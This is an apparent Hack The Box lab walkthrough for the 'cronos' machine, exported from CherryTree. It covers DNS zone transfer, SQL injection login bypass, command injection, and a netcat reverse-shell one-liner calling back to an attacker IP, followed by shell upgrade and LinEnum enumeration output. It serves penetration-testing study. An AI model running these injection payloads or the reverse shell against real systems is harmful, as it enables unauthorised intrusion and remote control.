<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>cronos</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#cronos">cronos</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#http">http</a></li>
<ol>
<li><a href="#vi /etc/hosts">vi /etc/hosts</a></li>
</ol>
<li><a href="#dns xfer (dig)">dns xfer (dig)</a></li>
<ol>
<li><a href="#www.cronos.htb">www.cronos.htb</a></li>
<li><a href="#ns1.cronos.htb">ns1.cronos.htb</a></li>
<li><a href="#admin.cronos.htb">admin.cronos.htb</a></li>
</ol>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#sqlmap admin.cronos.htb">sqlmap admin.cronos.htb</a></li>
<ol>
<li><a href="#login.req">login.req</a></li>
<li><a href="#sqlmap -r login.req">sqlmap -r login.req</a></li>
</ol>
<li><a href="#manual admin.cronos SQL injection">manual admin.cronos SQL injection</a></li>
<li><a href="#command execution">command execution</a></li>
<ol>
<li><a href="#burp repeater">burp repeater</a></li>
<li><a href="#pentest monkey reverse shell cheat sheet">pentest monkey reverse shell cheat sheet</a></li>
<ol>
<li><a href="#burp">burp</a></li>
<li><a href="#nc listener">nc listener</a></li>
</ol>
<li><a href="#reverse shell">reverse shell</a></li>
</ol>
</ol>
<li><a href="#Enumeration">Enumeration</a></li>
<ol>
<li><a href="#/dev/shm">/dev/shm</a></li>
<ol>
<li><a href="#download LinEnum">download LinEnum</a></li>
<li><a href="#run LinEnum">run LinEnum</a></li>
<ol>
<li><a href="#Report">Report</a></li>
</ol>
<li><a href="#schdeuled laravel owned by root">schdeuled laravel owned by root</a></li>
</ol>
</ol>
<li><a href="#priv esc with Kernel.php">priv esc with Kernel.php</a></li>
<ol>
<li><a href="#laravel scheduling task">laravel scheduling task</a></li>
<ol>
<li><a href="#find app/Console/Kernel.php">find app/Console/Kernel.php</a></li>
<li><a href="#Kernel.php">Kernel.php</a></li>
</ol>
<li><a href="#setuid.c">setuid.c</a></li>
<ol>
<li><a href="#CURL program to cronos">CURL program to cronos</a></li>
<li><a href="#update Kernel.php/ change owner of setuid.c to root">update Kernel.php/ change owner of setuid.c to root</a></li>
<li><a href="#move getuid.c to tmp folder &amp; privesc">move getuid.c to tmp folder &amp; privesc</a></li>
<li><a href="#root">root</a></li>
</ol>
</ol>
<li><a href="#priv esc with artisan">priv esc with artisan</a></li>
<ol>
<li><a href="#php-reverse-shell">php-reverse-shell</a></li>
</ol>
<li><a href="#priv esc with kernel exploit dirty cow">priv esc with kernel exploit dirty cow</a></li>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>cronos</u></b></h1><img alt="images/362-1.png" src="images/362-1.png"/><br/><img alt="images/362-2.png" src="images/362-2.png"/></div>
</body></html><div class="page" id="cronos"><h1><b><u>cronos</u></b></h1><img alt="images/362-1.png" src="images/362-1.png"/><br/><img alt="images/362-2.png" src="images/362-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/363-1.png" src="images/363-1.png"/>+<br/><br/><span style="color:#24ff00;">Services Open</span><br/><span style="color:#ffff00;">1) 22/tcp ssh &lt;-can ssh into box given credentials<br/>2) 53/tcp dns &lt;- likely going to need to zone xfer<br/>3) 80/tcp http &lt;-box runs a web application we may be able to exploit</span></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><span style="color:#24ff00;">Get Default page when visiting URL, check burp suite for potential redirect</span><br/><br/><img alt="images/1961-1.png" src="images/1961-1.png"/><br/><img alt="images/1961-2.png" src="images/1961-2.png"/><br/><br/><br/><span style="color:#24ff00;">swap IP address for </span><span style="color:#ffa500;">host: cronos.htb</span><br/><img alt="images/1961-3.png" src="images/1961-3.png"/><br/><br/><span style="color:#24ff00;">forward the packet and we see we get redirected to the real cronos http webpage, which means we should update our</span><span style="color:#ffa500;"> /etc/hosts </span><span style="color:#24ff00;">file to account for cronos.htb having the </span><span style="color:#ffff00;">ip 10.10.10.13</span><br/><img alt="images/1961-4.png" src="images/1961-4.png"/><br/></div>
<div class="page" id="vi /etc/hosts"><h1><b><u>vi /etc/hosts</u></b></h1><span style="color:#24ff00;">lets update our hosts file with </span><span style="color:#ffa500;">vi<br/></span><img alt="images/367-1.png" src="images/367-1.png"/><br/><br/><img alt="images/367-2.png" src="images/367-2.png"/><br/><br/><span style="color:#24ff00;">and now test out navigating to </span><span style="color:#ffff00;">cronos.htb</span><br/><img alt="images/367-3.png" src="images/367-3.png"/></div>
<div class="page" id="dns xfer (dig)"><h1><b><u>dns xfer (dig)</u></b></h1><span style="color:#24ff00;">the dig zone transfer command usage is</span><br/><span style="color:#ffa500;">dig axfr @&lt;IP&gt; &lt;hostname&gt;</span><br/><br/><img alt="images/366-1.png" src="images/366-1.png"/><br/><br/><br/><span style="color:#24ff00;">lets take these newly discovered domain names and edit </span><span style="color:#ffa500;">/etc/hosts </span><span style="color:#24ff00;">file with them</span><br/><img alt="images/366-2.png" src="images/366-2.png"/><br/><br/><img alt="images/366-3.png" src="images/366-3.png"/><br/></div>
<div class="page" id="www.cronos.htb"><h1><b><u>www.cronos.htb</u></b></h1><img alt="images/368-1.png" src="images/368-1.png"/></div>
<div class="page" id="ns1.cronos.htb"><h1><b><u>ns1.cronos.htb</u></b></h1><img alt="images/370-1.png" src="images/370-1.png"/></div>
<div class="page" id="admin.cronos.htb"><h1><b><u>admin.cronos.htb</u></b></h1><img alt="images/369-1.png" src="images/369-1.png"/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1></div>
<div class="page" id="sqlmap admin.cronos.htb"><h1><b><u>sqlmap admin.cronos.htb</u></b></h1><span style="color:#24ff00;">To use </span><span style="color:#ffa500;">sqlmap</span><span style="color:#24ff00;">, we first need to capture a </span><span style="color:#ffff00;">login request </span><span style="color:#24ff00;">to pass through as an argument</span><br/><br/><span style="color:#24ff00;">Capture sent login request with </span><span style="color:#ffa500;">Burp Suite</span><br/><img alt="images/365-1.png" src="images/365-1.png"/><br/><br/><br/><img alt="images/365-2.png" src="images/365-2.png"/><br/></div>
<div class="page" id="login.req"><h1><b><u>login.req</u></b></h1><span style="color:#24ff00;">copy this login request into </span><span style="color:#ffa500;">vi</span><span style="color:#24ff00;"> editor</span><br/><img alt="images/371-1.png" src="images/371-1.png"/><br/><img alt="images/371-2.png" src="images/371-2.png"/></div>
<div class="page" id="sqlmap -r login.req"><h1><b><u>sqlmap -r login.req</u></b></h1><img alt="images/372-1.png" src="images/372-1.png"/><br/><br/><br/><br/><img alt="images/372-2.png" src="images/372-2.png"/><br/><br/><br/><span style="color:#24ff00;">Sqlmap gets a redirect to<br/></span><span style="color:#ffa500;">admin.cronos.htb:80/welcome.php</span><br/><img alt="images/372-3.png" src="images/372-3.png"/><br/><br/><br/><img alt="images/372-4.png" src="images/372-4.png"/><br/><br/><span style="color:#24ff00;">Found this out when using USER INJECTION, lets try an sql injection then...</span><br/><img alt="images/372-5.png" src="images/372-5.png"/></div>
<div class="page" id="manual admin.cronos SQL injection"><h1><b><u>manual admin.cronos SQL injection</u></b></h1><span style="color:#24ff00;">because there's no proper input sanitation serverside when running sql queries on </span><span style="color:#ffff00;">cronos'</span><span style="color:#24ff00;"> backend, placing a </span><span style="color:#ffa500;">single quote</span> '<span style="color:#24ff00;"> escapes the </span><br/><span style="color:#ffa500;">SELECT * from Users where UserName = ‘username’</span> <span style="color:#24ff00;">database query</span><br/><span style="color:#24ff00;">and allows us to comment out the rest of the authentication query with </span><span style="color:#ffa500;">-- -</span><span style="color:#24ff00;"><br/>bypassing authentication entirely</span><br/><br/><img alt="images/373-1.png" src="images/373-1.png"/><br/><br/><br/><span style="color:#24ff00;">voila! we bypass authenticating with a password</span><br/><img alt="images/373-2.png" src="images/373-2.png"/><br/><br/></div>
<div class="page" id="command execution"><h1><b><u>command execution</u></b></h1><span style="color:#24ff00;">by appending a command after a ; character, we see we can execute server side requests<br/><br/></span><img alt="images/374-1.png" src="images/374-1.png"/><br/><br/><img alt="images/374-2.png" src="images/374-2.png"/><br/><br/><img alt="images/374-3.png" src="images/374-3.png"/></div>
<div class="page" id="burp repeater"><h1><b><u>burp repeater</u></b></h1><span style="color:#24ff00;">REMEMBER WE HAVE TO URL-ENCODE the commands we send with</span><span style="color:#ffa500;"> ctrl-U</span><span style="color:#24ff00;text-decoration:underline;"><br/><br/></span><img alt="images/376-1.png" src="images/376-1.png"/><br/><br/>Can do RCE through command as well:<br/><img alt="images/376-2.png" src="images/376-2.png"/><br/></div>
<div class="page" id="pentest monkey reverse shell cheat sheet"><h1><b><u>pentest monkey reverse shell cheat sheet</u></b></h1><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br/><span style="color:#ffa500;">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.62 1234 &gt;/tmp/f</span><br/><br/><img alt="images/377-1.png" src="images/377-1.png"/></div>
<div class="page" id="burp"><h1><b><u>burp</u></b></h1><h1>Pre URL-ENCODE<br/></h1><img alt="images/378-1.png" src="images/378-1.png"/><br/><br/>Post URL-ENCODE:<br/><img alt="images/378-2.png" src="images/378-2.png"/></div>
<div class="page" id="nc listener"><h1><b><u>nc listener</u></b></h1><img alt="images/379-1.png" src="images/379-1.png"/></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><img alt="images/375-1.png" src="images/375-1.png"/><br/><br/><span style="color:#24ff00;">import tty shell with python:</span><br/><br/><span style="color:#ffa500;">python -c ‘import pty;pty.spawn("/bin/bash")'</span><br/><img alt="images/375-2.png" src="images/375-2.png"/><br/><br/><span style="color:#24ff00;text-decoration:underline;">For tab auto-complete shell</span><br/><span style="color:#ffa500;">CNTL+Z to background<br/>stty raw -echo<br/>fg (foreground)</span><br/><img alt="images/375-3.png" src="images/375-3.png"/><br/><span style="color:#24ff00;">type </span><span style="color:#ffa500;">“fg" </span><span style="color:#24ff00;">after and punch the </span><span style="color:#ffa500;">enter</span><span style="color:#24ff00;"> key a couple of times</span><br/><br/><span style="color:#24ff00;">to clear screen capabilites export</span> <span style="color:#ffa500;">TERM=screen</span><br/><img alt="images/375-4.png" src="images/375-4.png"/><br/><br/><br/></div>
<div class="page" id="Enumeration"><h1><b><u>Enumeration</u></b></h1><span style="color:#24ff00;">Next is do have our target dl our enumeration scripts to check for potential vulnerabilities...</span><br/><br/><img alt="images/382-1.png" src="images/382-1.png"/><br/><br/><br/><img alt="images/382-2.png" src="images/382-2.png"/></div>
<div class="page" id="/dev/shm"><h1><b><u>/dev/shm</u></b></h1><span style="color:#24ff00;">The </span><span style="color:#ffa500;">/dev/shm</span><span style="color:#24ff00;"> directory empties itself and its contents on reboot which is a great place to save attack/enumeration tools</span><br/><img alt="images/383-1.png" src="images/383-1.png"/><br/></div>
<div class="page" id="download LinEnum"><h1><b><u>download LinEnum</u></b></h1><img alt="images/384-1.png" src="images/384-1.png"/></div>
<div class="page" id="run LinEnum"><h1><b><u>run LinEnum</u></b></h1><img alt="images/381-1.png" src="images/381-1.png"/><span style="color:#24ff00;"><br/><br/>the first 4 cron jobs are standard, however the 5th job is not common on linux boxes and is worth looking into<br/><br/></span><img alt="images/381-2.png" src="images/381-2.png"/><br/></div>
<div class="page" id="Report"><h1><b><u>Report</u></b></h1>-rw-r--r-- 1 root root  907 Jan 19  2017 systemd-resolved.service<br/>-rw-r--r-- 1 root root  696 Jan 19  2017 systemd-rfkill.service<br/>-rw-r--r-- 1 root root  497 Jan 19  2017 systemd-suspend.service<br/>-rw-r--r-- 1 root root  649 Jan 19  2017 systemd-sysctl.service<br/>-rw-r--r-- 1 root root  655 Jan 19  2017 systemd-timedated.service<br/>-rw-r--r-- 1 root root 1.1K Jan 19  2017 systemd-timesyncd.service<br/>-rw-r--r-- 1 root root  598 Jan 19  2017 systemd-tmpfiles-clean.service<br/>-rw-r--r-- 1 root root  703 Jan 19  2017 systemd-tmpfiles-setup-dev.service<br/>-rw-r--r-- 1 root root  683 Jan 19  2017 systemd-tmpfiles-setup.service<br/>-rw-r--r-- 1 root root  823 Jan 19  2017 systemd-udev-settle.service<br/>-rw-r--r-- 1 root root  743 Jan 19  2017 systemd-udev-trigger.service<br/>-rw-r--r-- 1 root root  825 Jan 19  2017 systemd-udevd.service<br/>-rw-r--r-- 1 root root  757 Jan 19  2017 systemd-update-utmp-runlevel.service<br/>-rw-r--r-- 1 root root  754 Jan 19  2017 systemd-update-utmp.service<br/>-rw-r--r-- 1 root root  573 Jan 19  2017 systemd-user-sessions.service<br/>-rw-r--r-- 1 root root  528 Jan 19  2017 user@.service<br/>-rw-r--r-- 1 root root  403 Jan 19  2017 -.slice<br/>-rw-r--r-- 1 root root  879 Jan 19  2017 basic.target<br/>-rw-r--r-- 1 root root  379 Jan 19  2017 bluetooth.target<br/>-rw-r--r-- 1 root root  358 Jan 19  2017 busnames.target<br/>-rw-r--r-- 1 root root  394 Jan 19  2017 cryptsetup-pre.target<br/>-rw-r--r-- 1 root root  366 Jan 19  2017 cryptsetup.target<br/>-rw-r--r-- 1 root root  670 Jan 19  2017 dev-hugepages.mount<br/>-rw-r--r-- 1 root root  624 Jan 19  2017 dev-mqueue.mount<br/>-rw-r--r-- 1 root root  431 Jan 19  2017 emergency.target<br/>-rw-r--r-- 1 root root  501 Jan 19  2017 exit.target<br/>-rw-r--r-- 1 root root  440 Jan 19  2017 final.target<br/>-rw-r--r-- 1 root root  460 Jan 19  2017 getty.target<br/>-rw-r--r-- 1 root root  558 Jan 19  2017 graphical.target<br/>-rw-r--r-- 1 root root  487 Jan 19  2017 halt.target<br/>-rw-r--r-- 1 root root  447 Jan 19  2017 hibernate.target<br/>-rw-r--r-- 1 root root  468 Jan 19  2017 hybrid-sleep.target<br/>-rw-r--r-- 1 root root  553 Jan 19  2017 initrd-fs.target<br/>-rw-r--r-- 1 root root  526 Jan 19  2017 initrd-root-fs.target<br/>-rw-r--r-- 1 root root  691 Jan 19  2017 initrd-switch-root.target<br/>-rw-r--r-- 1 root root  671 Jan 19  2017 initrd.target<br/>-rw-r--r-- 1 root root  501 Jan 19  2017 kexec.target<br/>-rw-r--r-- 1 root root  395 Jan 19  2017 local-fs-pre.target<br/>-rw-r--r-- 1 root root  507 Jan 19  2017 local-fs.target<br/>-rw-r--r-- 1 root root  405 Jan 19  2017 machine.slice<br/>-rw-r--r-- 1 root root  492 Jan 19  2017 multi-user.target<br/>-rw-r--r-- 1 root root  464 Jan 19  2017 network-online.target<br/>-rw-r--r-- 1 root root  461 Jan 19  2017 network-pre.target<br/>-rw-r--r-- 1 root root  480 Jan 19  2017 network.target<br/>-rw-r--r-- 1 root root  514 Jan 19  2017 nss-lookup.target<br/>-rw-r--r-- 1 root root  473 Jan 19  2017 nss-user-lookup.target<br/>-rw-r--r-- 1 root root  354 Jan 19  2017 paths.target<br/>-rw-r--r-- 1 root root  552 Jan 19  2017 poweroff.target<br/>-rw-r--r-- 1 root root  377 Jan 19  2017 printer.target<br/>-rw-r--r-- 1 root root  693 Jan 19  2017 proc-sys-fs-binfmt_misc.automount<br/>-rw-r--r-- 1 root root  603 Jan 19  2017 proc-sys-fs-binfmt_misc.mount<br/>-rw-r--r-- 1 root root  543 Jan 19  2017 reboot.target<br/>-rw-r--r-- 1 root root  396 Jan 19  2017 remote-fs-pre.target<br/>-rw-r--r-- 1 root root  482 Jan 19  2017 remote-fs.target<br/>-rw-r--r-- 1 root root  486 Jan 19  2017 rescue.target<br/>-rw-r--r-- 1 root root  500 Jan 19  2017 rpcbind.target<br/>-rw-r--r-- 1 root root  402 Jan 19  2017 shutdown.target<br/>-rw-r--r-- 1 root root  362 Jan 19  2017 sigpwr.target<br/>-rw-r--r-- 1 root root  420 Jan 19  2017 sleep.target<br/>-rw-r--r-- 1 root root  409 Jan 19  2017 slices.target<br/>-rw-r--r-- 1 root root  380 Jan 19  2017 smartcard.target<br/>-rw-r--r-- 1 root root  356 Jan 19  2017 sockets.target<br/>-rw-r--r-- 1 root root  380 Jan 19  2017 sound.target<br/>-rw-r--r-- 1 root root  441 Jan 19  2017 suspend.target<br/>-rw-r--r-- 1 root root  353 Jan 19  2017 swap.target<br/>-rw-r--r-- 1 root root  715 Jan 19  2017 sys-fs-fuse-connections.mount<br/>-rw-r--r-- 1 root root  719 Jan 19  2017 sys-kernel-config.mount<br/>-rw-r--r-- 1 root root  662 Jan 19  2017 sys-kernel-debug.mount<br/>-rw-r--r-- 1 root root  518 Jan 19  2017 sysinit.target<br/>-rw-r--r-- 1 root root 1.3K Jan 19  2017 syslog.socket<br/>-rw-r--r-- 1 root root  585 Jan 19  2017 system-update.target<br/>-rw-r--r-- 1 root root  436 Jan 19  2017 system.slice<br/>-rw-r--r-- 1 root root  646 Jan 19  2017 systemd-ask-password-console.path<br/>-rw-r--r-- 1 root root  574 Jan 19  2017 systemd-ask-password-wall.path<br/>-rw-r--r-- 1 root root  409 Jan 19  2017 systemd-bus-proxyd.socket<br/>-rw-r--r-- 1 root root  540 Jan 19  2017 systemd-fsckd.socket<br/>-rw-r--r-- 1 root root  524 Jan 19  2017 systemd-initctl.socket<br/>-rw-r--r-- 1 root root  607 Jan 19  2017 systemd-journald-audit.socket<br/>-rw-r--r-- 1 root root 1.1K Jan 19  2017 systemd-journald-dev-log.socket<br/>-rw-r--r-- 1 root root  842 Jan 19  2017 systemd-journald.socket<br/>-rw-r--r-- 1 root root  591 Jan 19  2017 systemd-networkd.socket<br/>-rw-r--r-- 1 root root  617 Jan 19  2017 systemd-rfkill.socket<br/>-rw-r--r-- 1 root root  450 Jan 19  2017 systemd-tmpfiles-clean.timer<br/>-rw-r--r-- 1 root root  578 Jan 19  2017 systemd-udevd-control.socket<br/>-rw-r--r-- 1 root root  570 Jan 19  2017 systemd-udevd-kernel.socket<br/>-rw-r--r-- 1 root root  395 Jan 19  2017 time-sync.target<br/>-rw-r--r-- 1 root root  405 Jan 19  2017 timers.target<br/>-rw-r--r-- 1 root root  417 Jan 19  2017 umount.target<br/>-rw-r--r-- 1 root root  392 Jan 19  2017 user.slice<br/>-rw-r--r-- 1 root root  663 Jan 18  2017 systemd-networkd-resolvconf-update.service<br/>-rw-r--r-- 1 root root  153 Jan 17  2017 apt-daily.service<br/>-rw-r--r-- 1 root root  162 Jan 17  2017 apt-daily.timer<br/>-rw-r--r-- 1 root root  342 Jan 13  2017 getty-static.service<br/>-rw-r--r-- 1 root root  153 Jan 13  2017 sigpwr-container-shutdown.service<br/>-rw-r--r-- 1 root root  152 Jan 13  2017 systemd-networkd-resolvconf-update.path<br/>-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service<br/>-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket<br/>-rw-r--r-- 1 root root  189 Dec 16  2016 uuidd.service<br/>-rw-r--r-- 1 root root  126 Dec 16  2016 uuidd.socket<br/>-rw-r--r-- 1 root root  320 Dec 14  2016 unattended-upgrades.service<br/>-rw-r--r-- 1 root root  420 Dec  7  2016 resolvconf.service<br/>-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service<br/>-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service<br/>-rw-r--r-- 1 root root  359 Nov 15  2016 bind9-resolvconf.service<br/>-rw-r--r-- 1 root root  239 Nov 15  2016 bind9.service<br/>-rw-r--r-- 1 root root  350 Nov 15  2016 bind9-pkcs11.service<br/>-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service<br/>-rw-r--r-- 1 root root  251 Sep 18  2016 open-vm-tools.service<br/>-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service<br/>-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service<br/>lrwxrwxrwx 1 root root   27 May 10  2016 plymouth-log.service -&gt; plymouth-read-write.service<br/>lrwxrwxrwx 1 root root   21 May 10  2016 plymouth.service -&gt; plymouth-quit.service<br/>-rw-r--r-- 1 root root  412 May 10  2016 plymouth-halt.service<br/>-rw-r--r-- 1 root root  426 May 10  2016 plymouth-kexec.service<br/>-rw-r--r-- 1 root root  421 May 10  2016 plymouth-poweroff.service<br/>-rw-r--r-- 1 root root  200 May 10  2016 plymouth-quit-wait.service<br/>-rw-r--r-- 1 root root  194 May 10  2016 plymouth-quit.service<br/>-rw-r--r-- 1 root root  244 May 10  2016 plymouth-read-write.service<br/>-rw-r--r-- 1 root root  416 May 10  2016 plymouth-reboot.service<br/>-rw-r--r-- 1 root root  532 May 10  2016 plymouth-start.service<br/>-rw-r--r-- 1 root root  291 May 10  2016 plymouth-switch-root.service<br/>-rw-r--r-- 1 root root  490 May 10  2016 systemd-ask-password-plymouth.path<br/>-rw-r--r-- 1 root root  467 May 10  2016 systemd-ask-password-plymouth.service<br/>-rw-r--r-- 1 root root  385 Apr 28  2016 ssh.service<br/>-rw-r--r-- 1 root root  216 Apr 28  2016 ssh.socket<br/>-rw-r--r-- 1 root root  196 Apr 28  2016 ssh@.service<br/>lrwxrwxrwx 1 root root    9 Apr 16  2016 lvm2.service -&gt; /dev/null<br/>-rw-r--r-- 1 root root  334 Apr 16  2016 dm-event.service<br/>-rw-r--r-- 1 root root  248 Apr 16  2016 dm-event.socket<br/>-rw-r--r-- 1 root root  380 Apr 16  2016 lvm2-lvmetad.service<br/>-rw-r--r-- 1 root root  215 Apr 16  2016 lvm2-lvmetad.socket<br/>-rw-r--r-- 1 root root  335 Apr 16  2016 lvm2-lvmpolld.service<br/>-rw-r--r-- 1 root root  213 Apr 16  2016 lvm2-lvmpolld.socket<br/>-rw-r--r-- 1 root root  658 Apr 16  2016 lvm2-monitor.service<br/>-rw-r--r-- 1 root root  382 Apr 16  2016 lvm2-pvscan@.service<br/>drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants<br/>drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants<br/>drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants<br/>drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants<br/>drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants<br/>-rw-r--r-- 1 root root  234 Apr  9  2016 acpid.service<br/>-rw-r--r-- 1 root root  251 Apr  6  2016 cron.service<br/>-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service<br/>-rw-r--r-- 1 root root  225 Mar 31  2016 apport-forward.socket<br/>-rw-r--r-- 1 root root  142 Mar 31  2016 apport-forward@.service<br/>-rw-r--r-- 1 root root  455 Mar 29  2016 iscsid.service<br/>-rw-r--r-- 1 root root 1.1K Mar 29  2016 open-iscsi.service<br/>-rw-r--r-- 1 root root  115 Feb 10  2016 acpid.socket<br/>-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.path<br/>-rw-r--r-- 1 root root  169 Jan 15  2016 atd.service<br/>-rw-r--r-- 1 root root  182 Jan 14  2016 polkitd.service<br/>-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service<br/>-rw-r--r-- 1 root root  241 Mar  3  2015 ufw.service<br/>-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service<br/>-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer<br/>-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service<br/>-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service<br/><br/>/lib/systemd/system/halt.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-halt.service -&gt; ../plymouth-halt.service<br/><br/>/lib/systemd/system/initrd-switch-root.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -&gt; ../plymouth-start.service<br/>lrwxrwxrwx 1 root root 31 May 10  2016 plymouth-switch-root.service -&gt; ../plymouth-switch-root.service<br/><br/>/lib/systemd/system/kexec.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-kexec.service -&gt; ../plymouth-kexec.service<br/><br/>/lib/systemd/system/multi-user.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 15 Mar 22  2017 getty.target -&gt; ../getty.target<br/>lrwxrwxrwx 1 root root 33 Mar 22  2017 systemd-ask-password-wall.path -&gt; ../systemd-ask-password-wall.path<br/>lrwxrwxrwx 1 root root 25 Mar 22  2017 systemd-logind.service -&gt; ../systemd-logind.service<br/>lrwxrwxrwx 1 root root 39 Mar 22  2017 systemd-update-utmp-runlevel.service -&gt; ../systemd-update-utmp-runlevel.service<br/>lrwxrwxrwx 1 root root 32 Mar 22  2017 systemd-user-sessions.service -&gt; ../systemd-user-sessions.service<br/>lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -&gt; ../dbus.service<br/>lrwxrwxrwx 1 root root 29 May 10  2016 plymouth-quit-wait.service -&gt; ../plymouth-quit-wait.service<br/>lrwxrwxrwx 1 root root 24 May 10  2016 plymouth-quit.service -&gt; ../plymouth-quit.service<br/><br/>/lib/systemd/system/poweroff.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 39 Mar 22  2017 systemd-update-utmp-runlevel.service -&gt; ../systemd-update-utmp-runlevel.service<br/>lrwxrwxrwx 1 root root 28 May 10  2016 plymouth-poweroff.service -&gt; ../plymouth-poweroff.service<br/><br/>/lib/systemd/system/reboot.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 39 Mar 22  2017 systemd-update-utmp-runlevel.service -&gt; ../systemd-update-utmp-runlevel.service<br/>lrwxrwxrwx 1 root root 26 May 10  2016 plymouth-reboot.service -&gt; ../plymouth-reboot.service<br/><br/>/lib/systemd/system/sysinit.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 24 Mar 22  2017 console-setup.service -&gt; ../console-setup.service<br/>lrwxrwxrwx 1 root root 20 Mar 22  2017 cryptsetup.target -&gt; ../cryptsetup.target<br/>lrwxrwxrwx 1 root root 22 Mar 22  2017 dev-hugepages.mount -&gt; ../dev-hugepages.mount<br/>lrwxrwxrwx 1 root root 19 Mar 22  2017 dev-mqueue.mount -&gt; ../dev-mqueue.mount<br/>lrwxrwxrwx 1 root root 25 Mar 22  2017 keyboard-setup.service -&gt; ../keyboard-setup.service<br/>lrwxrwxrwx 1 root root 28 Mar 22  2017 kmod-static-nodes.service -&gt; ../kmod-static-nodes.service<br/>lrwxrwxrwx 1 root root 36 Mar 22  2017 proc-sys-fs-binfmt_misc.automount -&gt; ../proc-sys-fs-binfmt_misc.automount<br/>lrwxrwxrwx 1 root root 19 Mar 22  2017 setvtrgb.service -&gt; ../setvtrgb.service<br/>lrwxrwxrwx 1 root root 32 Mar 22  2017 sys-fs-fuse-connections.mount -&gt; ../sys-fs-fuse-connections.mount<br/>lrwxrwxrwx 1 root root 26 Mar 22  2017 sys-kernel-config.mount -&gt; ../sys-kernel-config.mount<br/>lrwxrwxrwx 1 root root 25 Mar 22  2017 sys-kernel-debug.mount -&gt; ../sys-kernel-debug.mount<br/>lrwxrwxrwx 1 root root 36 Mar 22  2017 systemd-ask-password-console.path -&gt; ../systemd-ask-password-console.path<br/>lrwxrwxrwx 1 root root 25 Mar 22  2017 systemd-binfmt.service -&gt; ../systemd-binfmt.service<br/>lrwxrwxrwx 1 root root 30 Mar 22  2017 systemd-hwdb-update.service -&gt; ../systemd-hwdb-update.service<br/>lrwxrwxrwx 1 root root 32 Mar 22  2017 systemd-journal-flush.service -&gt; ../systemd-journal-flush.service<br/>lrwxrwxrwx 1 root root 27 Mar 22  2017 systemd-journald.service -&gt; ../systemd-journald.service<br/>lrwxrwxrwx 1 root root 36 Mar 22  2017 systemd-machine-id-commit.service -&gt; ../systemd-machine-id-commit.service<br/>lrwxrwxrwx 1 root root 31 Mar 22  2017 systemd-modules-load.service -&gt; ../systemd-modules-load.service<br/>lrwxrwxrwx 1 root root 30 Mar 22  2017 systemd-random-seed.service -&gt; ../systemd-random-seed.service<br/>lrwxrwxrwx 1 root root 25 Mar 22  2017 systemd-sysctl.service -&gt; ../systemd-sysctl.service<br/>lrwxrwxrwx 1 root root 37 Mar 22  2017 systemd-tmpfiles-setup-dev.service -&gt; ../systemd-tmpfiles-setup-dev.service<br/>lrwxrwxrwx 1 root root 33 Mar 22  2017 systemd-tmpfiles-setup.service -&gt; ../systemd-tmpfiles-setup.service<br/>lrwxrwxrwx 1 root root 31 Mar 22  2017 systemd-udev-trigger.service -&gt; ../systemd-udev-trigger.service<br/>lrwxrwxrwx 1 root root 24 Mar 22  2017 systemd-udevd.service -&gt; ../systemd-udevd.service<br/>lrwxrwxrwx 1 root root 30 Mar 22  2017 systemd-update-utmp.service -&gt; ../systemd-update-utmp.service<br/>lrwxrwxrwx 1 root root 30 May 10  2016 plymouth-read-write.service -&gt; ../plymouth-read-write.service<br/>lrwxrwxrwx 1 root root 25 May 10  2016 plymouth-start.service -&gt; ../plymouth-start.service<br/><br/>/lib/systemd/system/apache2.service.d:<br/>total 4.0K<br/>-rw-r--r-- 1 root root 42 Apr 12  2016 apache2-systemd.conf<br/><br/>/lib/systemd/system/sockets.target.wants:<br/>total 0<br/>lrwxrwxrwx 1 root root 30 Mar 22  2017 systemd-udevd-kernel.socket -&gt; ../systemd-udevd-kernel.socket<br/>lrwxrwxrwx 1 root root 25 Mar 22  2017 systemd-initctl.socket -&gt; ../systemd-initctl.socket<br/>lrwxrwxrwx 1 